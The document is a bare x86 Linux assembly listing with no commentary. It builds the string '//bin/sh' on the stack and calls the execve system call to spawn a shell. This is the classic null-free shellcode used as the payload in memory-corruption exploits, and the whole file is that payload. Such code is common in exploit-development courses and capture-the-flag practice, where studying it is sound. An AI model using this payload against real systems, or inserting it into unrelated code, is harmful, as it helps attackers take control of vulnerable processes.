section .text
    global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f6e
    push 0x69622f2f

    mov ebx, esp

    push eax
    push ebx
    mov ecx, esp

    xor edx, edx

    xor eax, eax
    mov al, 0x0b
    int 0x80
